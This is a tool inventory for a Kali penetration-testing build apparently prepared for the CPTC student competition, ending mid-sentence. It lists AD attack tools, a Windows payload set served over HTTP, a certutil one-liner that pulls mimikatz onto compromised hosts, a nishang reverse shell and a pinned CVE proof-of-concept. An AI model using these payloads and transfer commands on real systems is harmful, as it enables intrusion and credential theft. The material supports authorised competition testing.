# Tool Inventory — CPTC 12 Kali build

Everything the setup scripts in this repo install on a fresh Kali box, grouped by
who uses it. Generated from `start.sh`, `all.sh` and `ad.sh` — if you change an
install line in those, update this file in the same commit.

**Src** column: **S** = `start.sh` · **A** = `all.sh` · **D** = `ad.sh` · **I** = `all.sh --mobile` (formerly `--mobile`)

Run order: `start.sh` → (`all.sh` and the jVision server can run in parallel). `all.sh` includes the AD section — there is no third step.
The Windows box is independent: `windows.ps1`, during prep, while egress exists.
Lost a box mid-engagement? `smol-all.sh` installs the critical path only, in minutes —
see its header. Before the event, build against `REHEARSAL.md`.

| File | What it is |
|---|---|
| `README.md` | entry point: quick start, script order, log paths, contributor conventions |
| `start.sh` | bootstrap: base packages, docker, desktop, command logging + terminal uniform |
| `all.sh` | **the whole build** (~35 min): web, cloud, OT, reporting, Burp + its logging extension, **and AD/internal**. One apt phase, one verification pass, one summary |
| `all.sh --ad-only` · `--no-ad` | run only / skip the AD section |
| `all.sh --mobile` | the above **plus** the mobile kit and the nuclei-templates clone. `--mobile` still works as an alias |
| `ad.sh` | **wrapper → `all.sh --ad-only`.** Kept because the name is in muscle memory and the printed checklist |
| `windows.ps1` | the Windows box: Burp, Snaffler, BloodHound 4.3.1 + Neo4j 4.4.19 |
| `smol-all.sh` | emergency rebuild, critical path only (~5 min) |
| `lib.sh` | shared helpers, the `$USER_HOME` resolver, `install_burp_latest`, the **verification helpers** and the artifact **pin manifest** |
| `pins.sh` | record / verify the pinned sha256 values — see `REHEARSAL.md` |
| `command_logging.sh` · `burp_logging.sh` · `burp_logger.py` · `terminal_uniform.sh` | the engagement-evidence layer |
| `redaction_test.sh` | **proves both redactors do not leak.** Run after any change to either, and in every rehearsal |
| `~/pins.lock` | per-box record of what was actually downloaded — diff it between boxes |

**Nothing in the build asks a question.** Every `apt` call runs with
`DEBIAN_FRONTEND=noninteractive` *and* `--force-confdef --force-confold`, so neither
debconf nor a dpkg conffile prompt can stall it; `needrestart` is removed in
`start.sh` before the first big install rather than after. `all.sh`'s preflight
**reports** what is missing and continues — it used to stop and prompt `[N/y]`,
which made an unattended build impossible and refused to run at all without a TTY.
`STRICT_PREFLIGHT=1` restores the old abort-on-failure behaviour;
`SKIP_PREFLIGHT=1` skips the checks entirely.

**The scripts resolve the operator's home from their own path, so `sudo` is safe.**
`$HOME` is `/root` under sudo, which used to send `~/dropzone`, `~/.zshrc`,
`~/.BurpSuite` and `~/pins.lock` to root's account — the tools landed somewhere the
operator couldn't reach, the shell hooks logged nothing for the real user, and
verification then reported NOT FOUND for things that installed fine. `$USER_HOME`
is derived from the repo's own path (checked against `passwd`), with `$SUDO_USER`
and `$HOME` as fallbacks, and anything created as root is `chown`'d back.

## The one role flag

`all.sh` with no arguments installs everything it always did. There is exactly one
role, and it exists because two items dominate the build's weight while only one
operator needs them:

```
bash all.sh            # full standard suite
bash all.sh --mobile   # the above + mobile kit + nuclei-templates  (~2.3 GB extra)
bash all.sh --help
```

Deliberately the *only* role: splitting further costs more in "which flag do I need
again?" on engagement morning than it saves in bandwidth.

⚠️ **If nobody runs `--mobile`, nobody has nuclei templates offline.** `nuclei` itself
is always installed, but on first use it tries to download its own template set to
`~/.local/nuclei-templates`, which needs internet egress. On an isolated engagement
network that fetch fails. Either run `--mobile` on one box and copy the directory
across, or run `nuclei -update-templates` while egress still exists.

---

## Web

| Tool | Src | Notes |
|---|---|---|
| **Burp Suite Community** | A | 🆕 **No longer the apt package.** Installed from PortSwigger's official *latest community* download (`install_burp_latest` in `lib.sh`) → `/opt/burpsuite/`, launcher `/usr/local/bin/burpsuite`, plus a desktop entry for the xRDP session. ~**650 MB**. Edition is unambiguous, which settles the old "is the apt package Community?" question — Pro is banned. Installed **before** `burp_logging.sh` runs, which is now also in `all.sh` |
| `default-jdk` | A | 🆕 **Required by Burp and `openjdk-11-jdk` does not cover it.** Measured on 2026.3.3: `burp/StartBurp` is class-file **major 65 = Java 21**, and Java 17 fails with `UnsupportedClassVersionError ... class file version 65.0`. `openjdk-11-jdk` stays for ysoserial. The launcher picks a JVM ≥ 21 rather than trusting `java` |
| Burp CPTC Engagement Logger + `jython-standalone-2.7.3.jar` | S | → `~/.BurpSuite/`, auto-load patched into `UserConfig*.json` |
| `nuclei` | A | templates are **`--mobile` only** — see the warning above |
| `nuclei-templates` | **I** | clone → `~/dropzone/nuclei-templates`; **731 MB, full history** |
| `jwt_tool` | A | clone → `~/dropzone/jwt_tool`; run `python3 ~/dropzone/jwt_tool/jwt_tool.py` |
| `ysoserial` | A | **Java deserialisation gadget chains.** Not in Kali's repos, so it is a pinned jar → `~/dropzone/ysoserial-all.jar`. Run `java -jar ...`; needs the JRE from `openjdk-11-jdk` |
| `phpggc` | A | **PHP deserialisation gadget chains.** Kali package (pulls `php-cli`) |
| `arjun` | A | **hidden HTTP parameter discovery** — feeds the IDOR hunt |
| `gobuster` | A | |
| `feroxbuster` | A | |
| `ffuf` | A | |
| `dirsearch` | A | |
| `wfuzz` | A | |
| `nikto` | A | |
| `whatweb` | A | |
| `sslscan` | A | TLS/cipher review |
| `cyberchef` | A | **`file://`, no server — deliberately.** `/usr/bin/cyberchef` is `cd /usr/lib/cyberchef && xdg-open index.html`; nothing listens. Do **not** "fix" this by adding a localhost server: no port means nothing reachable from the engagement network and nothing to explain under §4.2. Verified 2026-10-05 on Kali 2026.2 (11.3.0-0kali1), because Kali ships the multi-file *web* build rather than upstream's single-file standalone: the page renders byte-identically from `file://` and `http://127.0.0.1` (501,184 B DOM, op list populated), and the 37 MB of lazy-loaded `modules/` load by **webpack script injection**, which `file://` permits (only `fetch()` is blocked, and chunks don't use it). So the silent failure mode — UI loads, operation does nothing — does not occur |
| `httpx` | A | Go → `~/go/bin` |
| `httprobe` | A | Go → `~/go/bin` |
| `subfinder` | A | Go → `~/go/bin` |
| `waybackurls` | A | Go → `~/go/bin`; needs egress, likely dead in-environment |

**Removed:** `zaproxy` — 211 MB download / 267 MB on disk for a second intercepting
proxy the team does not use. Burp is the one that gets run, and Burp is the one wired
into the evidence layer. Boxes built before this change still have it: `sudo apt purge zaproxy`.

## AD / internal

| Tool | Src | Notes |
|---|---|---|
| `impacket-scripts` | D | apt package; `impacket-secretsdump` etc. |
| `netexec` (`nxc`) | A + D | in both, so non-AD operators get it too; `crackmapexec` was dropped |
| `bloodhound` | D | BloodHound CE 9.4.0 — own DB stack, `bloodhound-setup` then `bloodhound-start` |
| `bloodhound.py` | D | `bloodhound-python` — **LEGACY** format collector, feeds BloodHound 4.3.1 on the Windows box |
| `bloodhound-ce-python` | D | 🆕 **CE** format collector, feeds the CE instance on this box. **Both are installed because both viewers exist** — see the two-stack note below. Its absence was a real bug: `ad.sh` set up a CE viewer with only the legacy collector, so the graph path failed at ingest |
| `krbrelayx` | D | 🆕 clone — **coercion + relay**, the half of AD that was entirely missing. `printerbug.py`, `addspn.py`, `dnstool.py`, `krbrelayx.py` |
| `gMSADumper` | D | 🆕 clone — group-managed service account passwords |
| `KeyTabExtract` | D | 🆕 clone — NTLM hashes out of a captured `.keytab` |
| `certighost` | D | 🆕 clone — **CVE-2026-54121** PoC. AD CS: low-priv domain user → DC-identity certificate → PKINIT → DCSync. Patched 2026-07-14, public PoC 2026-07-24. ⚠️ **unvetted third party — read it before the freeze.** Enumerate read-only first with `certipy find -vulnerable`. Cloned, deliberately **not** committed |
| `ligolo-ng` | D | 🆕 pinned v0.9.2 — `ligolo-proxy` → `/usr/local/bin`, agents into the payload set. A routed TUN tunnel instead of a SOCKS proxy; chisel/sshuttle/proxychains were the whole pivoting story before this |
| `neo4j` | D | listen addr configured only; **not** auto-started (no systemd unit, clashes with CE on 7474/7687) |
| `certipy-ad` | D | ADCS |
| `evil-winrm` | D | |
| `kerbrute` | D | binary → `/usr/local/bin` |
| `windapsearch` | D | binary → `/usr/local/bin` |
| `bloodyAD` | D | clone + `pip -r requirements.txt` |
| `PKINITtools` | D | clone; pairs with `minikerberos` |
| `powerview.py` | D | pip `powerview` — aniqfakhrul's port, **not** Kali's older `python3-pywerview`. Needs `libkrb5-dev` for its gssapi build |
| `pywhisker` | D | **Shadow Credentials** — writes `msDS-KeyCredentialLink`. Installed from the official ShutdownRepo, *not* the third-party PyPI package of the same name. Completes the chain with `certipy-ad` + `PKINITtools` |
| `targetedKerberoast` | D | clone — kerberoast accounts with no SPN by adding one, roasting, removing it |
| `ldap-utils` | D | `ldapsearch`. **Was in `smol-all.sh` and missing here** — that gap is now closed |
| `krb5-user` | D | `kinit` / `klist` / `kdestroy` — required by every `KRB5CCNAME` ccache workflow |
| `libkrb5-dev` | D | GSSAPI headers, so `powerview` builds |
| `freerdp3-x11` | D | **binary is `xfreerdp3`, not `xfreerdp`.** Scriptable RDP, pass-the-hash via `/pth:` |
| `ntpsec-ntpdate` | D | ⚠️ the plain `ntpdate` package **no longer exists in Kali**. Fixes clock skew (`KRB_AP_ERR_SKEW`): `sudo ntpdate <dc-ip>`. Lands in `/usr/sbin` |
| `Ghostpack-CompiledBinaries` | D | clone — Rubeus/SharpUp/etc. precompiled |
| `SharpEfsPotato` | D | clone + mono build (`mono-complete`, `mono-devel`) |
| `pypykatz` | A + D | |
| `minikerberos` | A + D | |
| `aardwolf` | D | RDP; non-fatal if the build fails |
| `responder` | A + D | |
| `enum4linux` | A + D | |
| `smbclient` / `smbmap` / `nbtscan` | A | SMB enum, used from the AD flow |

## ⚠️ Two BloodHound stacks — and why

Mixing a legacy collection with a CE one **fails at ingest**; it does not degrade.
The collectors are therefore kept in separate directories.

| Viewer | Where | Fed by |
|---|---|---|
| **BloodHound CE 9.4.0** | Kali (`sudo bloodhound-start`) | `bloodhound-ce-python` · `windows/ce/SharpHound.exe` (2.x) · `azurehound` |
| **BloodHound 4.3.1 legacy** | the Windows box (`windows.ps1`) | `bloodhound-python` · `windows/legacy/SharpHound.exe` (1.x) |

Neither can be dropped:

- **CE cannot run on the Windows box.** CE is a Docker Compose stack and its only
  documented Windows install path is Docker Desktop, which is unsupported on every
  edition of Windows Server. An on-box viewer therefore has to be legacy.
- **CE cannot be dropped from Kali.** AzureHound v3 emits CE format only, and
  cloud + on-prem landing in one graph is the entire reason AzureHound is installed.

## Windows payload set — `~/dropzone/windows/` (built by `ad.sh`)

**Not installed on our Windows box.** These are uploaded to compromised Windows
targets, served from Kali. The directory is a flat HTTP root so the transfer line
stays short under pressure:

```
cd ~/dropzone/windows && python3 -m http.server 9999
  target> certutil -urlcache -split -f http://<kali>:9999/mimikatz.exe m.exe
```

Replaces the previous roster's checked-in 72 MB `AD_Tools.zip`. Same tools, but
each one pinned to an upstream release and hash-verified instead of being an opaque
blob of 2024-vintage binaries we would have to explain if asked (rules §4.3).

| Tool | Notes |
|---|---|
| `mimikatz.exe` | pinned 2.2.0-20220919; x64 extracted from the official zip, rest discarded |
| `Rubeus` · `Seatbelt` · `SharpUp` · `Certify` · `SafetyKatz` | **not here** — they come from the existing `Ghostpack-CompiledBinaries` clone. One source, not two |
| `PowerView.ps1` | PowerSploit `master` — archived upstream, never tagged, so unpinnable by version |
| `Powermad.ps1` | **the RBCD chain does not work without this** |
| `Invoke-RunasCs.ps1` | run as another user without a full shell |
| `adPEAS.ps1` | pinned v2.6.0 — domain enumeration in one script |
| `SessionGopher.ps1` | saved PuTTY/WinSCP/RDP session secrets |
| `Invoke-PowerShellTcp.ps1` | nishang reverse shell |
| `PowerUpSQL` | 🆕 clone — MSSQL enumeration + privesc. Nothing covered MSSQL before |
| `GodPotato-NET4.exe` | pinned V1.20 — the potato that still works on Server 2016/2019/2022 |
| `JuicyPotato.exe` | pinned v0.1 — kept for the *older* hosts an aging estate has |
| `PrintSpoofer64.exe` | pinned v1.0 |
| `SeManageVolumeExploit.exe` | pinned `public` |
| `LaZagne.exe` | pinned v2.4.7 — browser/app credential recovery |
| `accesschk64.exe` | Sysinternals; vendor serves "current" only |
| `pstools/` | Sysinternals PSTools — PsExec, PsService, PsLogList, PsLoggedon |
| `agent.exe` | ligolo-ng Windows agent, pinned v0.9.2 |
| `legacy/SharpHound.exe` | **v1.1.1 — LEGACY format.** Feeds BloodHound 4.3.1 |
| `ce/SharpHound.exe` | **v2.17.0 — CE format.** Feeds BloodHound CE |
| `cve-2023-29360-src/` | MSKSSRV.SYS LPE — **source only**, build it during prep |

**Deliberately dropped from the old zip:** every duplicate of something already
pinned (chisel ×4, linpeas, winpeas, pspy64, PowerUp, privesc, PrivescCheck,
kerbrute) · nested `.git` directories and `__pycache__` · a leftover Kerberos
**ccache** and a `krbrelayx/hash` file, neither of which belongs in a public repo ·
`sbloggingbypass.txt`, a script-block-logging bypass that buys nothing with no blue
team scoring us and contradicts the evidence layer this repo exists to provide ·
`amsibypass.txt`, a 2021 one-liner that is almost certainly dead.

> **Provenance check, 2026-10-05.** Twelve of the upstream-pinned files are
> **byte-for-byte the same size** as their counterparts inside the old zip
> (PowerView, Powermad, Invoke-RunasCs, JuicyPotato, PrintSpoofer64,
> SeManageVolumeExploit, SessionGopher, Invoke-PowerShellTcp, winpeas, privesc,
> PrivescCheck, pspy64). The cherry-pick lost nothing, and the old blob's binaries
> were genuine upstream builds.

## The Windows box — `windows.ps1`

Its job is narrow: **BloodHound graph viewing and occasional dynamic mobile work.**
No active testing runs from Windows, so there is no PowerShell evidence layer —
there would be nothing to attribute. Offensive payloads live on Kali (above).

| Item | Notes |
|---|---|
| `burp-suite-free-edition` | Burp **Community** via choco — the mobile-traffic proxy. Pro is banned |
| `openssh` · `git` · `flameshot` · `greenshot` | choco |
| `temurin11` | JDK 11 — Neo4j 4.4's runtime |
| **Neo4j 4.4.19** | pinned, downloaded direct. ⚠️ **NOT** choco's `neo4j-community`, which tracks 5.x. 4.4.19 is the version BloodHound 4.3.1's release notes name, and Neo4j 5 has a severe BloodHound ingest regression |
| **BloodHound 4.3.1** | from `SpecterOps/BloodHound-Legacy`. ⚠️ the old repo's `BloodHoundAD/BloodHound` URL is **dead** — renamed/archived |
| `Snaffler.exe` | pinned 1.0.244 — share-content hunting |
| PuTTY scrollback | 10 000 lines |

Switches: `-SkipDefender`, `-SkipBloodHound`. Has its own pin table (PowerShell
cannot source `lib.sh`) and writes its own `~/pins.lock` rows.

⚠️ **It needs internet.** Chocolatey and every download reach the public net, so run
it during prep, not on engagement morning. Defender RTM and the firewall are
disabled — the **pre-change state is written to
`~/pre-change-security-state.txt`** first, which is what makes the change
reversible and what to quote on the Artifact & Configuration Changes sheet.

## Cloud

| Tool | Src | Notes |
|---|---|---|
| `awscli` | A | |
| `pacu` | A | pip |
| `ScoutSuite` | A | pip |
| `principalmapper` | A | pip — IAM privesc paths |
| `azure-cli` (`az`) | A | **in Kali's own repo** (2.90.0-1) — no Microsoft apt repo, no GPG dance. ~175 MB with deps |
| `AzureHound` | A | pinned release zip → `/usr/local/bin/azurehound`. Feeds the **same** BloodHound CE instance `ad.sh` installs, so Azure and on-prem paths land in one graph |
| `ROADtools` (`roadrecon`) | A | pip — Entra ID recon |

Everything above the `azure-cli` line is AWS-only, which was the hole: CPTC's own
infrastructure is an Entra/M365 tenant, deliverables live in M365, and the CPTC 12
client was identified *through* its Azure tenant.

## Mobile — `--mobile` only

| Tool | Src | Notes |
|---|---|---|
| `jadx` | I | ~69 MB; pulls `default-jre` |
| `apktool` | I | |
| `adb` | I | |
| `openssl` | I | |
| `frida-tools` | I | pip |
| Android Studio | I | **1.5 GB download, ~4 GB installed** → `/opt/android-studio`, symlinked to `/usr/local/bin/android-studio`. The tarball is deleted after extraction. ⚠️ its **emulator needs nested virtualisation**, which a VDI almost certainly does not expose — treat it as an APK/layout inspector, not a way to run apps |

Per the KB this is a **time-boxed hedge**, not a discipline: there is no evidence mobile
has ever been in scope. The useful flow is ~90 minutes of `apktool` → `jadx` → grep →
hand the endpoint list to the web team.

## OT / ICS

> ⚠️ **Read the doctrine before running any of this.** Prove reachability **read-only**,
> then **stop** and escalate in character. `modbuster` can write coils and holding
> registers; `opcattack` can forge signatures. Do not point either at anything ride-,
> safety- or life-safety-shaped. Disrupting the environment is an explicit point loss
> and a DQ risk — *"we could have stopped a ride mid-cycle and chose to report it
> instead"* is the stronger report line.

| Tool | Src | Notes |
|---|---|---|
| `icspacket` | A | pip — the broad one: DNP3 (IEEE 1815), MMS (ISO 9506) + IEC 61850, IEC 60870-5-104, EtherNet/IP (CIP), BACnet/IP, plus Modbus and OPC-UA layered on pymodbus/asyncua. A **library**, not a CLI — which suits the read-only doctrine: a scripted read is easier to keep harmless and easier to put in the report |
| `asyncua` | A | pip — OPC-UA client library; also `opcattack`'s dependency |
| `opcattack` | A | clone → `~/dropzone/opcattack`; OPC-UA auth/reflection/signature-forgery testing |
| `modbuster` | A | clone → installed via pipx (pip fallback); Modbus TCP read **and write** |

Context: CPTC 11 (maritime) contained **zero** industrial protocols — every "ship
control" was a web dashboard or a netcat listener. These are here for the case where
CPTC 12 ships real OT, not because it is expected.

## Others

| Category | Tool | Src | Notes |
|---|---|---|---|
| Recon | `nmap` | S | also drives `jvisionclient.py` |
| Recon | `masscan` | A | |
| Recon | `dnsrecon` | A | |
| Recon | `onesixtyone`, `snmp` | A | SNMP |
| Recon | `sipvicious` | A | VoIP |
| Recon | `oscanner`, `tnscmd10g` | A | Oracle |
| Recon | `redis-tools` | A | |
| Recon | `smtp-user-enum` | A | |
| Credentials | `hashcat` | A | NTLM cracking for the AD flow; no GPU on the VDI |
| Credentials | `john` | A | |
| Credentials | `hydra` | A | |
| Credentials | `username-anarchy` | A | → `~/dropzone/` |
| Wordlists | `seclists` | A | apt → `/usr/share/seclists`; **519 MB down, 1.85 GB on disk** |
| Wordlists | `kali-wordlists` | A | clone → `/usr/share/wordlists/kali-wordlists` |
| Wordlists | `rockyou.txt` | A | gunzipped in place |
| Exploitation | `metasploit-framework` | A | |
| Exploitation | `set` | A | SET — social engineering only if explicitly in scope |
| Exploitation | `aircrack-ng` | A | |
| Pivoting | `chisel` | A | → `/usr/local/bin` |
| Pivoting | `sshuttle` | A | |
| Pivoting | `proxychains4` | A | |
| Pivoting | `socat`, `netcat-traditional` | A | |
| Shells | `upshell` | A | TTY upgrade helper → `/usr/local/bin` |
| Shells | `rlwrap` | A | `rlwrap nc -lvnp 443` makes a raw reverse shell survivable |
| Privesc | `linpeas.sh` | A | → `~/dropzone/privesc/` |
| Privesc | `winpeas.exe` | A | pinned to release `20241011-2e37ba11` |
| Privesc | `PowerUp.ps1`, `privesc.ps1`, `PrivescCheck.ps1` | A | → `~/dropzone/privesc/` |
| Privesc | `pspy64` | A | → `~/dropzone/` |
| Traffic | `wireshark` (`tshark`), `tcpdump` | A | |
| Forensics | `steghide`, `binwalk`, `exiftool` | A | |
| Containers | `docker.io`, `docker-compose` | S + A | in `start.sh` for jVision; `usermod -aG docker` in both |
| Evidence | `flameshot`, `scrot`, `maim` | A | screenshots for the report |
| Editor | Burp launcher | A | `/usr/local/bin/burpsuite` + `/usr/share/applications/burpsuite.desktop` |
| Workspace | `tmux`, `screen`, `terminator` | A | |
| Workspace | `remmina` | A | RDP client (GUI; `xfreerdp3` from `ad.sh` is the scriptable one) |
| Workspace | `mc` | A | Midnight Commander |
| Editor | `sublime-text` | A | own apt repo |
| Reporting | `tesseract-ocr`, `python3-pytesseract` | A | OCR |
| Reporting | `python3-docx`, `python3-openpyxl`, `python3-pil` | A | docx + xlsx findings sheet + images |
| Reporting | `python3-pymupdf` + `python3-fitz` | A | **both** required — the `fitz` alias is a separate package |
| Reporting | `libreoffice-writer` | A | docx→pdf; 333 MB with deps — trim first if disk is tight |
| Desktop | `kali-desktop-xfce`, `xorg`, `xrdp` | S | xRDP for Burp's GUI; **~2.2 GB, the heaviest thing in the build** |
| Access | SSH service | S | enabled + started |
| Runtime | `python3`, `python3-pip`, `python3-venv` | S + A | |
| Runtime | `requests`, `beautifulsoup4` (pip) · **`python3-pwntools` (apt)** | S | jVision client deps. Installed **one pip call each** — a single call aborts the whole transaction on one bad wheel, which is how a failed `unicorn` build took `requests` and `bs4` down with it on the clean-VM run. `argparse` was **removed**: stdlib since 2.7, and the PyPI package shadows it with a 2012 backport |
| Runtime | `golang` | A | builds the 4 Go tools |
| Runtime | `openjdk-11-jdk` | A | ✅ **verified present in Kali** (11.0.31+11-1). Needed by Burp and `ysoserial` |
| Build | `build-essential`, `python3-dev`, `libffi-dev`, `cmake`, `ninja-build`, `pkg-config` | S+D | lets `aardwolf` compile. `cmake` + `build-essential` are also in `start.sh`: `pwntools` pulls `unicorn`, which builds C extensions and fails with `No such file or directory: 'cmake'` on a stock Kali image |
| Build | `mono-complete`, `mono-devel` | D | conditional, for SharpEfsPotato |
| Build | `apt-transport-https`, `libssl-dev` | A | |
| Base | `git`, `curl`, `wget`, `unzip` | S + A | `unzip` unpacks the AzureHound release |
| Fallback | `pipx` | D | only if apt `netexec` is unavailable |

---

## Weight — what actually costs time

Measured against the live Kali 2026.2 package index. Closure figures for metapackages
include base packages a real VDI may already have, so they are upper bounds.

| Item | Download | On disk | Where |
|---|---|---|---|
| `kali-desktop-xfce` + `xorg` + `xrdp` | **~2.2 GB** (2083 pkgs) | — | `start.sh` |
| Android Studio | **1.5 GB** | ~4 GB | `all.sh --mobile` |
| `nuclei-templates` clone | **731 MB** | 731 MB | `all.sh --mobile` |
| `seclists` | 519 MB | 1.85 GB | `all.sh` |
| **Burp Suite Community (jar)** | **653 MB** | 653 MB | `all.sh` |
| `libreoffice-writer` | 333 MB (419 deps) | — | `all.sh` |
| `metasploit-framework` | 258 MB | 599 MB | `all.sh` |
| `bloodhound` + `neo4j` | 198 MB | 404 MB | `ad.sh` |
| `azure-cli` | 175 MB (284 deps) | — | `all.sh` |
| `jadx` | 69 MB | 75 MB | `all.sh --mobile` |
| `golang` + compiling 4 Go tools | 42 MB + CPU | — | `all.sh` |
| **Windows payload set** (19 pinned artifacts) | **~45 MB** | ~45 MB | `ad.sh` |
| ↳ heaviest three: `LaZagne` 10 MB · `ligolo-proxy` 8 MB · `adPEAS` 5.8 MB | | | |
| Neo4j 4.4.19 + BloodHound 4.3.1 + temurin11 | ~**400 MB** | — | `windows.ps1` |
| *everything else added 2026-09-22* | **~1 MB total** | — | — |

Two notes worth keeping:
- **`nuclei-templates` is a full-history clone.** `clone_pinned` only passes `--depth 1`
  when given a tag, and that call has none. Shallow-cloning would drop ~700 MB for free.
- Dropping `zaproxy` gave back 211 MB, which roughly paid for `azure-cli` + `jadx`.

## Where things land

| Path | What |
|---|---|
| `~/dropzone/` | clones and downloaded payloads |
| `~/dropzone/windows/` | **the Windows payload set** — flat HTTP root, serve it from here |
| `~/dropzone/windows/legacy/` | SharpHound **1.1.1** (legacy format) → BloodHound 4.3.1 |
| `~/dropzone/windows/ce/` | SharpHound **2.17.0** (CE format) → BloodHound CE |
| `~/dropzone/privesc/` | linpeas / winpeas / PowerUp / privesc / PrivescCheck |
| `~/dropzone/ysoserial-all.jar` | ysoserial fat jar |
| `/usr/local/bin/` | `chisel`, `upshell`, `kerbrute`, `windapsearch`, `azurehound`, `android-studio`, `ligolo-proxy` |
| `C:\BloodHound\` | *(Windows box)* BloodHound 4.3.1, Neo4j 4.4.19, `neo4j-credentials.txt` |
| `~/pre-change-security-state.txt` | *(Windows box)* Defender/firewall state before `windows.ps1` touched it |
| `/opt/android-studio/` | Android Studio (`--mobile`) |
| `~/go/bin/` | `httpx`, `httprobe`, `subfinder`, `waybackurls` |
| `/usr/share/wordlists/` | `rockyou.txt`, `kali-wordlists/` |
| `/usr/share/seclists/` | SecLists |
| `~/.BurpSuite/` | Jython jar + `burp_logger.py` |
| `/opt/burpsuite/` | Burp jar + `VERSION`; `burpsuite.jar` is a symlink to the current one |
| `/usr/sbin/ntpdate` | from `ntpsec-ntpdate` — not on a normal user's PATH |

## Engagement-evidence layer (not tools, but installed)

| Artifact | Written by | Path |
|---|---|---|
| Readable command log | `command_logging.sh` (zsh + bash hooks) | `~/.zsh_history_readable` |
| Burp HTTP log | `burp_logger.py` extension | `~/.burp_history_readable` |
| Uniform terminal | `terminal_uniform.sh` | qterminal + xfce4-terminal configs |

## Counts

65 apt in `all.sh` main list + 8 reporting + `azure-cli` + Sublime · 4 more under `--mobile` ·
**20** apt in `ad.sh` (+2 mono) · 14 apt in `start.sh` ·
8 pip (A) + 1 pip (I) + 4 pip (D) · 4 Go ·
**32 pin-manifest artifacts** (all hash-verified; `powerup` removed) · **21 `fetch_pinned` + 12 `clone_pinned` in `ad.sh`** ·
3 pinned artifacts in `windows.ps1` + 6 choco packages.

## Gaps and open items

- **`sqlmap` and `SSTImap` are still deliberately absent.** Do not re-add without asking.
  Worth re-confirming before the freeze: the client's own careers page names **ticketing
  and point-of-sale** as the attack surface, and the build has no SQLi tool at all.
- **jVision `dotnet:5.0` base images are EOL** — pre-pull and `docker save` them during
  prep so engagement day isn't the first time a failed pull is discovered.
- 🆕 **`certighost` is an unvetted third-party exploit.** Read it before the repo freeze.
  There are four public PoCs for CVE-2026-54121; we pinned `aniqfakhrul`'s on the grounds
  that `ad.sh` already installs his `powerview.py`. If a review turns up something better,
  swap the clone URL.
- 🆕 **`cve-2023-29360` ships as source only** — it needs building on a Windows box with
  the VS build tools. That is a prep task, and it is not done.
- 🆕 **`smol-all.sh` does not re-arm the Windows payload set or ligolo.** A rebuilt box
  gets the critical path only, by design — but if the box that died was the one serving
  payloads, `ad.sh` has to be re-run to get `~/dropzone/windows` back. Worth knowing
  before it happens rather than during.
- 🆕 **`smol-all.sh` still downloads linpeas and chisel with no hash check.** It
  duplicates those two URLs from `lib.sh` deliberately (it must survive a partial clone),
  but now that the manifest is fully pinned it is the only unverified download path left —
  on the box most likely to be rebuilt under time pressure. Two inlined hash literals
  would close it. **Not done.**
- ✅ **Pin hashes are DONE — 0 of 33 artifacts are unverified** (was 32 of 33), recorded
  2026-10-05. Two things to know:
  - **`pins.sh --write` had never worked.** Its sed was anchored `^PIN_SHA\[`, but almost
    every manifest entry puts `PIN_SHA` after `PIN_VER` on a shared line, so the pattern
    matched nothing — and the script printed "lib.sh updated" anyway. Every hash stayed
    `TBD` while `REHEARSAL.md` told people this was how to fill them in. Fixed, and it now
    refuses to report a write it did not make.
  - **11 of 33 still track a moving target** (`latest`/`master`/`current`: linpeas,
    PowerUp, PrivescCheck, PowerView, Powermad, PSTools, AccessChk…). They are now
    hash-*enforced* at the recorded value, so if upstream moves, `fetch_pinned` fails
    loudly rather than silently installing something else. Before the freeze that is the
    behaviour you want; `bash pins.sh --verify` is the drift check.
  - `pins.sh --record/--write/--verify` now take artifact names, so you can re-pin a few
    entries without re-downloading Android Studio's 1.5 GB.
- **Commented out, not installed:** Sliver C2, upstream Neo4j apt repo,
  `statistically-likely-usernames`, NaturalT314 ToolBox.
- ✅ **Closed:** the mobile gap (now `--mobile`), the `ldap-utils` gap that `smol-all.sh`
  flagged, and the `openjdk-11-jdk` question (verified present in Kali).
- ✅ **Closed 2026-10-05 (eleventh pass): run 5 is FULLY CLEAN, and the two mechanisms a
  green run cannot prove were proven by deliberate fault injection.**
  Run 5 (`667b94a`, clean snapshot, umask 0007): **115 passed, 0 warnings, 0 failed**,
  `[+] All critical tools verified!`, zero apt failures, zero hash mismatches, 31 artifacts
  verified against their pins in-run, `chisel installed: 1.12.0`. `start.sh` 2m47s,
  `all.sh` 32m58s, both exit 0. The only `[-]` line in the whole log is
  `command logging installed but NOTHING logged yet - hook not loaded` — the one item no
  script can fix, because loading a shell hook into the shell that invoked the script is
  impossible.
  **A clean run proves nothing about error handling**, so `DPkg::Lock::Timeout` and
  `Acquire::Retries` were tested by causing the faults:
  - **`DPkg::Lock::Timeout=600`** — held the dpkg frontend lock for 30 s and raced two
    installs against it on the same box:
    ```
    WITHOUT:  E: Unable to acquire the dpkg frontend lock ...   elapsed 0s   -> toilet NOT installed
    WITH:     Waiting for cache lock: ... held by process 32405  elapsed 31s  -> lolcat INSTALLED
    ```
    That is run 1's five-lost-packages failure reproduced on demand and fixed on demand.
    ⚠️ **Harness note for anyone repeating this: `flock(2)` does NOT work.** apt takes a
    POSIX `fcntl` record lock, and on Linux the two lock types do not conflict — a
    `flock -x` on `lock-frontend` is completely ignored by apt and the first two attempts
    at this test produced a false pass. Hold it with `fcntl.lockf` instead.
  - **`Acquire::Retries=3`** — pointed apt at a black-holed mirror (`10.255.255.1`) and
    counted fetch attempts: **2 without the option, 6 with it**. Retries happen.
  **Five end-to-end runs on the `clean-kali` snapshot, 8 failures → 0.** Every run found
  something the previous one could not reach, which is the argument for running it to
  completion rather than reading it: run 1 was blocked by permissions from ever testing
  Burp, run 2 by a symlink deleted while fixing run 1, run 3 by a flaky mirror, and run 4
  by an upstream release landing mid-test.
- ✅ **Closed 2026-10-05 (tenth pass): run 4 — 115 passed, 0 warnings, 0 failed** in the
  verification pass. `start.sh` 12m38s, `all.sh` 36m51s, both exit 0, umask 0007. Every fix
  from runs 1–3 confirmed green: `httpx`/`subfinder`/`httprobe`/`waybackurls` all verified
  by absolute GOPATH path, `opcattack dependencies installed (pins relaxed)` +
  `keepalive module present` + `opcattack verified` (honestly this time),
  `libreoffice-writer installed` + `soffice verified`, `Burp jar verified (684704951 bytes)`,
  and `~/go/bin` now `drwxr-xr-x` / `-rwxr-xr-x`.
  It then found a **design flaw in the pin manifest**:
  🔴 **A floating URL paired with a fixed sha256 is not a pin, it is a scheduled false
  alarm.** The run reported
  `[-] linpeas SHA256 MISMATCH - expected 795e315c... got 7454e8f3...` /
  `Do NOT use this file until you know why.` on a perfectly good file — because
  `PIN_URL[linpeas]` used `releases/latest/download/` and **PEASS-ng had cut a release
  three hours earlier** (`20261003-ea9b2e92` → `20261005-c6b483d8`, published
  2026-10-05T15:56:37Z). They ship every couple of days, so this would have fired
